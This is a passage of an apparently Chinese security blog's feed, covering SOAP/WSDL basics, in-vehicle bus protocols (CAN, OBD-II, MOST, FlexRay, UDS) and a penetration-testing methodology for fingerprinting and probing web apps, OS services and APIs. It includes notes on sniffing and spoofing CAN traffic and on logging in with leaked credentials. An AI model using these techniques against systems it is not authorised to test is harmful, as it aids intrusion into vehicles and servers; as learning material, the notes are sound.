class="name">definitions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">types</span>&gt;</span></span><br><span class="line">       definition of types........</span><br><span class="line">       数据类型定义的容器，它使用某种类型系统(一般地使用XML Schema中的类型系统)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">types</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">        definition of a message....</span><br><span class="line">通信消息的数据结构的抽象类型化定义。使用Types所定义的类型来定义整个消息的数据结构。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">portType</span>&gt;</span></span><br><span class="line">        definition of a port.......</span><br><span class="line">对于某个访问入口点类型所支持的操作的抽象集合，这些操作可以由一个或多个服务访问点来支持。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">portType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">binding</span>&gt;</span></span><br><span class="line">        definition of a binding....</span><br><span class="line">特定端口类型的具体协议和数据格式规范的绑定。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">binding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span>&gt;</span></span><br><span class="line">        相关服务访问点的集合。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servie</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br></pre></td></tr></table></figure><p>举个小李子</p><h2 id="综上所述"><a class="markdownIt-Anchor" href="#综上所述"></a> 综上所述</h2><p>综上所述</p><ul><li>SOAP可以类比http协议：定义了方式</li><li>WSDL可以类比一个http服务的接口文档；</li></ul><p>在了解了WebService、SOAP以及WSDL相关概念以后, 接着我们的目标便是用ksoap2来发起网络请求获取数据了。</p><p>举个小例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wsdl:binding</span> <span class="attr">name</span>=<span class="string">&quot;WeatherWebServiceSoap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;tns:WeatherWebServiceSoap&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">soap:binding</span> <span class="attr">transport</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/http&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">wsdl:operation</span> <span class="attr">name</span>=<span class="string">&quot;getWeatherbyCityName&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">soap:operation</span> <span class="attr">soapAction</span>=<span class="string">&quot;http://WebXml.com.cn/getWeatherbyCityName&quot;</span> <span class="attr">style</span>=<span class="string">&quot;document&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">wsdl:input</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">&quot;literal&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">wsdl:input</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">wsdl:output</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">&quot;literal&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">wsdl:output</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">wsdl:operation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">wsdl:binding</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;wsdl-soap以及webservice&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#wsdl-soap以及webservice&quot;&gt;&lt;/a&gt; WSDL、SOAP以及WebService&lt;/h1&gt;
&lt;p&gt;什么是WebService、什</summary>
      
    
    
    
    <category term="开发基础" scheme="https://j3f5.github.io/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>车联网基础-协议</title>
    <link href="https://j3f5.github.io/articles/2023/06/12/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/"/>
    <id>https://j3f5.github.io/articles/2023/06/12/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/</id>
    <published>2023-06-12T02:19:22.000Z</published>
    <updated>2023-06-15T02:19:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="can协议"><a class="markdownIt-Anchor" href="#can协议"></a> CAN协议</h1><p>总线协议通过车辆的网络控制数据包的传输。其中有成百上千的传感器与我们的车辆系统相连接，总线协议的选择至关重要，CAN协议就是其中之一，它常常配合着OBD-II连接器出现。</p><p>CAN协议有高速车线和低速车线</p><ul><li>高速（CANH）：RPM控制</li><li>中低速（CANL）：门把所、空调</li></ul><p>这意味着当信号进来时，CAN提高一条线上的电压，并降低另一条线上的电压。这种差分信号用于必须容错噪声的环境中，例如汽车系统和制造业。当一个位在CAN总线上传输时，信号将同时广播高1V和低1V。传感器和ECU有一个收发器，检查以确保两个信号都被触发;如果不是，收发器将数据包作为噪声拒绝。</p><p>两根双绞线组成总线，要求总线两端端接。在终端两端的两根电线上有一个120欧姆的电阻。如果模块不在总线的末端，则不必担心终止。作为一个可能窃听线路的人，你唯一需要担心的是，如果你为了嗅探线路而拆除了终端设备。</p><h2 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h2><p>CAN总线的通信通过一种类似于“<strong>会议</strong>”的机制实现的，只不过会议的过程并不是由一方（节点）主导，而是<strong>每一个会议参加人员都可以自由的提出会议议题</strong>（多主通信模式）。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111013955.png" alt="image-20230615111013955" style="zoom:80%;" /><p>CAN总线的优点：</p><ul><li>通信速率最高可达1MB/s（此时距离最长40m）。节点数实际可达110个。</li><li>采用短帧结构，每一帧的有效字节数为8个。</li><li>每帧信息都有CRC校验及其他检错措施，数据出错率极低。</li><li>通信介质可采用双绞线，同轴电缆和光导纤维，一般采用廉价的双绞线即可，无特殊要求。节点在错误严重的情况下，具有自动关闭总线的功能，切断它与总线的联系，以使总线上的其他操作不受影响。</li></ul><h2 id="obd-ii连接器找can总线"><a class="markdownIt-Anchor" href="#obd-ii连接器找can总线"></a> OBD-II连接器找CAN总线</h2><p>许多车辆配备了一个OBD-II连接器，也被称为诊断链路连接器（DLC），它与车辆的内部网络进行通信。你通常会发现这个连接器在转向柱下或隐藏在仪表盘的其他地方，在一个相对容易接近的地方。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image4.jpg" alt="Diagram showing where the OBDII is located inside a vehicle" style="zoom: 25%;" /><p>在搜索电缆时很容易找到 CAN，因为它的静止电压为 2.5V。当信号进来时，它会增加或减少 1V（3.5V 或 1.5V）。 CAN 线贯穿车辆并连接 ECU 和其他传感器，它们始终采用双线对。如果连接万用表并检查车辆中的电线电压，您会发现它们将静止在 2.5V 或波动 1V。如果您发现一根电线以 2.5V 电压传输，几乎可以肯定是 CAN。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230612104520243.png" alt="image-20230612104520243" style="zoom: 67%;" /><p>在图中，6号和14号引脚用于标准的高速CAN线（HS-CAN）。中速和低速通信发生在其他引脚上。一些汽车使用CAN的中速（MS-CAN）和低速（LS-CAN），但许多车辆对这些通信使用不同的协议。你会发现，并非所有的总线都通过OBD-II连接器暴露出来。你可以使用接线图来帮助定位额外的 &quot;内部 &quot;总线线路。</p><h2 id="can数据包组成"><a class="markdownIt-Anchor" href="#can数据包组成"></a> CAN数据包组成</h2><p><strong>标准</strong></p><p>每个CAN总线数据包包含四个关键元素：</p><ol><li>仲裁ID：仲裁ID是一个广播信息，用于识别试图进行通信的设备的ID，尽管任何一个设备可以发送多个仲裁ID。如果两个CAN数据包同时沿总线发送，则仲裁ID较低的数据包获胜。</li><li>标识符扩展（IDE）：对于标准的CAN，该位总是0。</li><li>数据长度代码（DLC）：这是数据的大小，范围从0到8字节。</li><li>数据：这就是数据本身。一个标准的CAN总线数据包所携带的数据的最大尺寸可以达到8字节，但有些系统通过填充数据包来强制要求8字节。</li></ol><p><strong>拓展</strong></p><p>扩展数据包与标准数据包一样，<strong>只是它们可以被串联起来以创建更长的ID</strong>。扩展数据包被设计成适合于标准的CAN格式，以保持向后的兼容性。因此，如果一个传感器不支持扩展数据包，那么如果另一个数据包在同一网络上传输扩展的CAN数据包，它就不会中断。</p><p>标准数据包在使用标志方面也与扩展数据包不同。当查看网络转储中的扩展数据包时，你会发现与标准数据包不同，扩展数据包使用替代远程请求（SRR）来代替远程传输请求（RTR），并将SSR设置为1。 他们也会将<strong>IDE设置为1</strong>，而且他们的数据包会有一个18位的标识符，这是标准11位标识符的第二部分。还有一些特定于某些制造商的CAN风格的协议，它们也是向后兼容标准CAN的，与扩展CAN的方式基本相同。</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230612104714733.png" alt="image-20230612104714733" /></p><p>因为<strong>CAN总线数据包是广播</strong>的，所以同一网络上的所有控制器都能看到每个数据包，有点像以太网上的UDP。包集不携带有关哪个控制器(或攻击者)发送了什么的信息。因为任何设备都可以看到和传输数据包，所以<strong>总线上的任何设备都可以模拟任何其他设备</strong>。</p><h2 id="can数据包标准"><a class="markdownIt-Anchor" href="#can数据包标准"></a> CAN数据包标准</h2><h3 id="iso-tpiso-15765-5"><a class="markdownIt-Anchor" href="#iso-tpiso-15765-5"></a> ISO-TP（ISO 15765-5）</h3><p>此标准的主要作用在 <strong>诊断+KWP消息（CAN的一种替代协议）</strong>，当然也可以在发送大量数据包的时候使用 。接受拓展CAN数据包。</p><blockquote><p>为了将ISO TP封装进CAN，将CAN数据字段首字节用于<strong>扩展寻址</strong>，所以只剩下7个字节用于传输数据本身。通过ISO TP发送大量信息容易引起<strong>泛洪</strong>，因此在繁忙的总线上传输信息需要小心。</p></blockquote><h3 id="canopen"><a class="markdownIt-Anchor" href="#canopen"></a> <a href="https://baike.baidu.com/item/CANopen/2700924?fr=aladdin">CANopen</a></h3><p><strong>CANopen</strong>是一种架构在控制局域网络控制局域网络（Controller Area Network, CAN）上的高层通信协议，包括通信子协议及设备子协议，常在嵌入式系统中使用，也是工业控制常用到的一种现场总线。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/format,f_auto.jpeg" alt="img" style="zoom:67%;" /><p>该协议是CAN协议的另一种扩展协议。其特点如下：</p><ol><li>数据包构造改变</li><li>通信是有大量总裁ID为：<code>0x0</code></li><li>11位标识符分解为：4个功能码+7位节点ID</li><li>仲裁ID附近有一个确定的结构，例如心跳协议的消息格式：<code>0x700 + 节点ID</code></li></ol><blockquote><p><strong>心跳协议</strong>（Heartbeat protocol）是用来监控网络中的节点及确认其正常工作。心跳信息的生产者（一般是 slave 设备）周期性的送出功能码 1110、ID 为本身节点 ID 的讯息，信息的数据部分有一个表示节点状态的位。而心跳信息的消费者负责接收上述数据，若在指定时间（于设备的对象字典中定义）内，消费者均未收到信息，可采取相应动作（例如显示错误或重置该设备）。</p></blockquote><h2 id="gmlan总线"><a class="markdownIt-Anchor" href="#gmlan总线"></a> GMLAN总线</h2><p>是汽车中CAN总线的实现。基于ISO-TP，与UDS协议（统一诊断服务）类似。</p><p>组成：一条低速+两条高速</p><ul><li>低速：33.33Kbps+32节点</li><li>高速：500Kbps+16节点</li></ul><h1 id="sae-j1850协议pwm-vpm"><a class="markdownIt-Anchor" href="#sae-j1850协议pwm-vpm"></a> SAE J1850协议（PWM VPM）</h1><p>特点就是老旧，很少用了，简单介绍一下。</p><p>两种类型+3中速率（ABC）：</p><ol><li><p>PWM脉宽调制</p><ol><li>引脚2和10运行差分信号，5V高电压，双线差分信号</li><li>1为高信号，0为低</li></ol></li><li><p>VPM可变脉冲调制</p><ol><li><p>引脚2，单线总线，7V高电压</p></li><li><p>数据包格式：</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615102305571.png" alt="image-20230615102305571" style="zoom:67%;" /><ul><li>PPP：优先级，111最低</li><li>H：起始字节大小，0为3字节，1为单字节</li><li>K：帧内响应，0为需求，1为不允许</li><li>Y：寻址模式，0为功能，1为物理</li><li>ZZ：消息类型</li></ul><p>帧内响应（IFR）数据会紧跟VPM后面，有EOD/EOF信号作为结束</p></li></ol></li></ol><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615100342475.png" alt="image-20230615100342475" style="zoom:80%;" /><h1 id="关键字协议kwp2000与iso-9141-2"><a class="markdownIt-Anchor" href="#关键字协议kwp2000与iso-9141-2"></a> 关键字协议（KWP2000）与ISO 9141-2</h1><p>KWP使用引脚7，消息最多包含255字节，有两个变种（主要在初始化）：</p><ul><li>ISO 14230-4 KWP（5波特的初始化）</li><li>ISO 14230-4 KMP（快速初始化）</li></ul><p>ISO 9141-2或K-Line是KWP的变种，使用引脚7，14为备选。</p><h1 id="局域互联网协议lin"><a class="markdownIt-Anchor" href="#局域互联网协议lin"></a> 局域互联网协议（LIN）</h1><p>作为CAN的补充，成本最低。特点如下：</p><ul><li>没有仲裁码/优先级代码，由单独主节点负责传输</li><li>最多支持16个从节点，监听主节点并实时响应。而主节点连接CAN</li><li>工作在12V电压的单线总线，不接入OBD</li><li>帧格式如下，Header由主节点发送，其余主/从节点都可发送</li></ul><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615103350855.png" alt="image-20230615103350855" style="zoom:80%;" /><p>注：</p><ol><li>ID表示消息类型，有64种可能性，ID60与ID64为诊断信息。当读取诊断信息时，8字节用于诊断，第一个字节被称为诊断节点地址（NAD）。字节的前部分为ISO标准定义，后半部分为厂商设备独有。</li></ol><h1 id="面向媒体的系统传输most"><a class="markdownIt-Anchor" href="#面向媒体的系统传输most"></a> 面向媒体的系统传输（MOST）</h1><p>使用与媒体设备，其特点在于：</p><ol><li><p>环形拓扑/虚拟星拓扑，有MOST设备作为定时的主设备，连续发送数据帧，最多支持64个MOST设备。</p><ol><li>除了主设备，其他都有分配地址，支持即插即用</li></ol></li><li><p>MOST分为三种速率：MOST25 / 50 / 150。使用的材料不同，定位不同。</p></li><li><p>MOST 总线利用光脉冲传输数据，采用环形结构，<strong>在环形总线内只能朝着一个方向传输数据</strong></p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615110310507.png" alt="image-20230615110310507" style="zoom:67%;" /></li><li><p>每个MOST帧有三个通道：</p><ol><li>同步域：流数据（音/视频）</li><li>异步域：分组数据（TCP/IP）</li><li>控制域：控制和低速数据（HMI）</li></ol></li></ol><h2 id="most网络层"><a class="markdownIt-Anchor" href="#most网络层"></a> MOST网络层</h2><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615104520680.png" alt="image-20230615104520680" style="zoom:80%;" /><h2 id="破解most"><a class="markdownIt-Anchor" href="#破解most"></a> 破解MOST</h2><p>可以通过一个支持该协议的设备，如IVI或者车载MOST控制器进行破解。工具为：most4linux，可以：</p><ol><li>most_aplay播放wav文件</li><li>ctrl_tx 发送一条广播控制消息并检查其状态</li><li>sync_tx 实时传输</li><li>sync_rx 实时接收</li></ol><h1 id="flexray"><a class="markdownIt-Anchor" href="#flexray"></a> FlexRay</h1><p>是一种高速总线，传输速率高达10Mpbs，用于时间敏感的通信，例如线控驱动、线控转向、线控啥车。其实现成本高于CAN。所以FlexRay高端，CAN中端，LIN低端。</p><p>与CAN类似，为总线型拓扑结构，也与以太网类似，支持星型拓扑结构。专为车内联网设计，采用基于时间触发机制</p><p>FlexRay总线<strong>工作原理</strong>：FlexRay总线数据收发采取<strong>时间触发和事件触发</strong>的方式。</p><ul><li>利用时间触发通信时，网络中的各个节点都预先知道彼此将要进行通信的时间， 接收器提前知道报文到达的时间，报文在总线上的时间可以预测出来。</li></ul><p>它采用了周期通信的方式，一个通信周期可以划分为<strong>静态部分</strong>、<strong>动态部分</strong>、<strong>特征窗</strong>和<strong>网络空闲</strong>时间4个部分。</p><ul><li><strong>静态部分</strong>和<strong>动态部分</strong>用来传输总线数据，即FlexRay报文。</li><li><strong>特征窗</strong>用来发送唤醒特征符和媒介访问检测特征符。网络空闲时间用来实现分布式的时钟同步和节点参数的初始化。</li></ul><h1 id="汽车以太网"><a class="markdownIt-Anchor" href="#汽车以太网"></a> 汽车以太网</h1><p>正在逐步替代上述协议，为了能够让车联网真正地适配。例如CAN可以封装成UDP包。</p><h1 id="obd-ii连接引脚图"><a class="markdownIt-Anchor" href="#obd-ii连接引脚图"></a> OBD-II连接引脚图</h1><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111458202.png" alt="image-20230615111458202" style="zoom:80%;" /><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111523022.png" alt="image-20230615111523022" style="zoom:67%;" /><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111543026.png" alt="image-20230615111543026" style="zoom:67%;" /><h1 id="诊断服务uds-obd-kwp"><a class="markdownIt-Anchor" href="#诊断服务uds-obd-kwp"></a> 诊断服务（UDS OBD KWP）</h1><p>ISO 14230的OBD七层模型和ISO 14229的增强型诊断七层模型</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lZenhtNjY=,size_16,color_FFFFFF,t_70.png" alt="img" /></p><p>增强型诊断：</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/format,png.png" alt="img" style="zoom: 70%;" /><p>首先，OBD（汽车排放和驱动性相关）和增强型诊断（面向整车所有ECU）都属于系统级，拥有完整的七层模型。</p><p>其次，USD作为服务，处于模型的应用层和会话层。</p><p>而KWP2000作为汽车专用协议，处于模型的第4层至第1层。</p><p>另外，CAN因为使用较广泛，关于汽车的ISO 15765处于第4层至第3层。而通用的底层协议ISO 11898处于第2层至第1层。</p><p>所以，我们可以理解为OBD系统调用了UDS、KWP2000、CAN这些协议。而这些协议也能够被别的系统调用，组成新的七层模型。</p><p>OBD通过服务号（SID）调用相关UDS的服务，然后UDS根据应用的底层（K-Line、CAN-bus等）调用KWP2000或CAN。</p><p>即：</p><ol><li>OBD作为系统，自上而下，标准庞大而清晰。</li><li>UDS作为服务，上层清晰，兼容不同下层，以最终功能实现为要求。</li><li>OBD是关注车辆实时排放的理念形成的行业规范，而UDS是诊断服务的统一化规范。</li><li>UDS是面向整车所有ECU(电控单元)的，而OBD是面向排放系统ECU的。</li></ol><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>CAN总线是中坚，LIN总线是CAN总线的副手，FlexRay总线是未来的希望，MOST总线则负责车载多媒体业务。而随着车辆ECU的增多，车辆网络拓扑结构也越来越负责，比如说一辆车需要有多种总线（CAN总线，LIN，以太网，FlexRay）</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FmbXpodQ==,size_16,color_FFFFFF,t_70.png" alt="img" /></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/%E8%BD%A6%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE.png" alt="车联网协议" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;can协议&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#can协议&quot;&gt;&lt;/a&gt; CAN协议&lt;/h1&gt;
&lt;p&gt;总线协议通过车辆的网络控制数据包的传输。其中有成百上千的传感器与我们的车辆系统相连接，总线协议的选择至关重要，CAN协议就是其</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="协议" scheme="https://j3f5.github.io/tags/%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全</title>
    <link href="https://j3f5.github.io/articles/2023/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-08T06:00:59.000Z</published>
    <updated>2023-06-08T06:00:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><ol><li>为什么要做漏洞发现？如果知道漏洞，就不用进行很多攻击，直接利用exp</li><li>漏洞类型&amp;危害条件？知道危害条件就可以先做好准备，例如得到低权限shell等等，看他是权限提升漏洞还是什么漏洞，就可以方便我们达成目标</li><li>如何做好未卜先知？做好信息搜集</li></ol><p>此部分包含四个部分：如下</p><h2 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统"></a> 操作系统</h2><p>一般都通过指纹来识别操作系统，还有一个特别古早的方法：Linux分大小写但是Windows不分</p><h2 id="web应用"><a class="markdownIt-Anchor" href="#web应用"></a> WEB应用</h2><p>其实都差不多的思路，首先去找公开漏洞，不行就自己审计。</p><h3 id="已知-cms"><a class="markdownIt-Anchor" href="#已知-cms"></a> 已知 CMS</h3><p>如常见的 dedecms，discuz，wordpress 等源码结构，这种一般采用非框架类开发，但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要</p><ul><li><strong>利用公开的漏洞进行测试</strong></li><li>如不存在可<strong>自行搭建环境，采用白盒代码审计自行挖掘</strong>。</li></ul><h3 id="开发框架"><a class="markdownIt-Anchor" href="#开发框架"></a> 开发框架</h3><p>如常见的 thinkphp，spring，flask 等开发的源码程序，这种源码程序正常的安全测试思路：</p><ol><li>先获取对应的开发框架信息(名字，版本)，通过<strong>公开的框架类安全问题进行测试</strong></li><li><strong>如不存在可采用白盒代码审计自行挖掘</strong></li></ol><h3 id="未知-cms"><a class="markdownIt-Anchor" href="#未知-cms"></a> 未知 CMS</h3><p>如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构，针对此类的源码程序测试思路：</p><ol><li>能识别<strong>二次开发就按已知CMS 思路</strong>进行</li><li>不能确定二次开发的话可以采用<strong>常规综合类扫描工具</strong>或脚本进行探针，也可以采用<strong>人工探针</strong>（功能点，参数，盲猜）</li><li>同样在有源码的情况下也可以进行代码审计自行挖掘</li></ol><h2 id="app应用"><a class="markdownIt-Anchor" href="#app应用"></a> APP应用</h2><p>一般来说，做了适应性的app都可以使用类似于web渗透的方法进行攻击，除非是采用特定的框架，采用非适应性（也就是用web浏览器打开不太行，不能做到适配，例如以此为开头的一般都是适应性的：<code>m.xxx.com</code>）</p><h2 id="api接口服务安全"><a class="markdownIt-Anchor" href="#api接口服务安全"></a> API接口服务安全</h2><p>分清api接口的类别，一般xml就是web service，而json就是restful。尽量找到wsdl的配置文件，看入口函数以及参数定义，这样子就能够构造数据包（使用postman也行，使用soapui啥的也行），构造完之后就是正常的渗透测试流程了，不太一样就是把这个包的参数都要自己摸索传输，而web传输我们抓包可以模仿一下~</p><h1 id="操作系统漏洞发现"><a class="markdownIt-Anchor" href="#操作系统漏洞发现"></a> 操作系统漏洞发现</h1><p>学会使用一些工具：Nessus、Nmap、Goby。通过扫描的结果。</p><ol><li>判断操作系统信息，版本、类型等</li><li>判断操作系统开放端口</li><li>查找历史漏洞，冲就完事了</li></ol><h1 id="web应用漏洞发现"><a class="markdownIt-Anchor" href="#web应用漏洞发现"></a> WEB应用漏洞发现</h1><h2 id="识别web应用"><a class="markdownIt-Anchor" href="#识别web应用"></a> 识别WEB应用</h2><p>看上面是分三类，所以主要是如何去测定这个是什么CMS或者是什么框架开发的。这个测定方法一般有：</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/Web%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF.png" alt="Web应用指纹分析思路" /></p><h3 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h3><ol><li><p>查看数据包。</p><ol><li>查看头/源码，头里面可能会有特征值<ul><li><strong>http头</strong>。查看http响应报头的X-Powered-By字段来识别，可以通过netcat来识别，使用netcat 127.0.0.1 80对127.0.0.1主机的80端口web服务器框架进行识别。</li><li><strong>Cookies</strong>。一些框架有固定的Cookies名称，这些名称一般情况都不会更改，例如zope3、cakephp、kohanasesson、laravel_session。</li><li><strong>Html源代码</strong>。html源代码中包含注释、js、css等信息，通过访问这些信息来判断和确认cms系统框架。在源代码中常常会包含powered by、bulit upon、running等特征。</li></ul></li><li>查看请求地址URL，请求地址目录有特征值<ol><li>wp-content那就是wordpress的</li><li>特殊文件和文件夹</li></ol></li></ol></li><li><p>查看特殊文件（计算md5）</p><ol><li>robots.txt文件（例如dedecms的）</li><li>favicon.ico、css、logo.ico、js等文件的md5 比对网站类型，通过收集CMS公开代码中的独有文件，这些文件一般轻易不会更改，通过爬虫对这些文件进行抓取并比对md5值，如果一样，则认为该系统匹配</li></ol></li><li><p>查看端口：对于端口服务类，详细见下文</p></li></ol><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><ol><li>whatweb</li><li>wapplyze</li><li>whatruns</li></ol><p>参考：<a href="https://blog.51cto.com/simeon/2115190">https://blog.51cto.com/simeon/2115190</a></p><h2 id="整一个实战流程"><a class="markdownIt-Anchor" href="#整一个实战流程"></a> 整一个实战流程</h2><ol><li>首先识别一下这个网站是什么cms【即上面所说的】<ol><li>看到了robots.txt，那么就直接往whatweb一搜就好，知道是什么cms之后就去查一下版本</li></ol></li><li>知道CMS信息就去查历史漏洞，好像没有可以用的历史漏洞，那就看看<strong>后台地址</strong>是啥，看能不能爆破啥的<ol><li>但是这个后台地址已经改掉了</li></ol></li><li>就去查端口，看有什么应用，对应的漏洞<ol><li>发现888、8888端口，那应该是宝塔waf应用，所以就去看看这个漏洞是啥</li><li>有一个漏洞</li></ol></li><li>啥都没了，那就看看信息/代码泄露，去查看有什么配置信息，可以去看数据库有什么密码之类的<ol><li>看到密码，直接登录，OK</li></ol></li></ol><h1 id="app应用漏洞发现"><a class="markdownIt-Anchor" href="#app应用漏洞发现"></a> APP应用漏洞发现</h1><p>反编译提取 URL 或抓包获取 URL，进行 WEB 应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/APP%E5%BA%94%E7%94%A8.png" alt="APP应用" /></p><ol><li><strong>APP-&gt;WEB APP-&gt;其他 APP-&gt;逆向</strong></li><li><strong>WEB 